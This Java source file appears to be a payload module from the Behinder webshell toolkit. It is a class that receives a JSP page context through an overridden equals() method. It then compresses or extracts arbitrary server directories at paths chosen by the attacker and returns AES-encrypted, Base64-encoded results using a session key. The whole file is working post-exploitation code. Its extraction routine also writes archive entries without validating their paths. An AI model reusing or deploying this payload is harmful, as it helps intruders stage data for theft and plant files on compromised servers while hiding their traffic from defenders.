package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class Zip {
    public static String mode;
    public static String sourceDirPath;
    public static String zipFilePath;
    public static String excludeExt;
    private String[] exts = excludeExt.split("\\|");
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    @Override
    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();

        ZipOutputStream zos = null;
        try {
            if (mode.equals("compress")) {
                File sourceDir = new File(sourceDirPath);
                File zipFile = new File(zipFilePath);
                zos = new ZipOutputStream(new FileOutputStream(zipFile));
                compress(sourceDir, "", zos);
                result.put("msg", zipFilePath);
                result.put("status", "success");
            } else if (mode.equals("uncompress")) {
                unCompress(new File(zipFilePath), sourceDirPath);
                result.put("msg", sourceDirPath);
                result.put("status", "success");
            }
        } catch (Exception e) {
            result.put("msg", e.toString());
            result.put("status", "fail");
        } finally {
            try {
                assert zos != null;
                zos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
        }
        return false;
    }

    private void compress(File f, String baseDir, ZipOutputStream zos) throws Exception {
        File[] fs = f.listFiles();
        BufferedInputStream bis;
        byte[] bufs = new byte[1024*10];
        FileInputStream fis;

        labelA:
        for(int i=0; i<fs.length; i++){
            String fName =  fs[i].getName();
            labelB:
            for (String ext: exts) {
                if (fName.endsWith(ext)) {
                    continue labelA;
                }
            }
            if(fs[i].isFile()){
                ZipEntry zipEntry = new ZipEntry(baseDir + fName);
                zos.putNextEntry(zipEntry);
                fis = new FileInputStream(fs[i]);
                bis = new BufferedInputStream(fis, 1024*10);
                int read = 0;
                while((read=bis.read(bufs, 0, 1024*10)) != -1){
                    zos.write(bufs, 0, read);
                }
                bis.close();
                fis.close();
            } else if(fs[i].isDirectory()) {
                compress(fs[i], baseDir + fName+"/", zos);
            }
        }
    }

    private void unCompress(File srcFile, String destDirPath) throws Exception {
        ZipFile zipFile = new ZipFile(srcFile);
        Enumeration<?> entries = zipFile.entries();
        while (entries.hasMoreElements()) {
            ZipEntry entry = (ZipEntry) entries.nextElement();
            // 如果是文件夹，就创建个文件夹
            if (entry.isDirectory()) {
                String dirPath = destDirPath + "/" + entry.getName();
                File dir = new File(dirPath);
                dir.mkdirs();
            } else {
                // 如果是文件，就先创建一个文件，然后用io流把内容copy过去
                File targetFile = new File(destDirPath + "/" + entry.getName());
                // 保证这个文件的父文件夹必须要存在
                if(!targetFile.getParentFile().exists()){
                    targetFile.getParentFile().mkdirs();
                }
                targetFile.createNewFile();
                // 将压缩文件内容写入到这个文件中
                InputStream is = zipFile.getInputStream(entry);
                FileOutputStream fos = new FileOutputStream(targetFile);
                int len;
                byte[] buf = new byte[1024];
                while ((len = is.read(buf)) != -1) {
                    fos.write(buf, 0, len);
                }
                // 关流顺序，先打开的后关闭
                fos.close();
                is.close();
            }
        }
        zipFile.close();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode)
            {
                if (version.compareTo("1.9") >= 0) {

                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                }
                else {

                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
